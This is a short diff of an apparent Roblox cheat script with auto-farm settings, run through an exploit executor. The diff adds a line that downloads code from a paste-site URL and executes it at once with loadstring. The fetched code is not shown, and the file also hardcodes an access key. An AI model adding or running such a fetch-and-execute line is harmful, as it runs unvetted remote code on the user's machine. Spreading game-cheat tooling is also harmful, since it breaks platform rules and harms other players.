@@ -1,4 +1,5 @@
 repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
+loadstring(game:HttpGet("https://pastefy.app/jwI9u1EL/raw"))()
 getgenv().Key = "f6a5469c773ec765370f5254"
     getgenv().SettingFarm ={
         ["Hide UI"] = false,
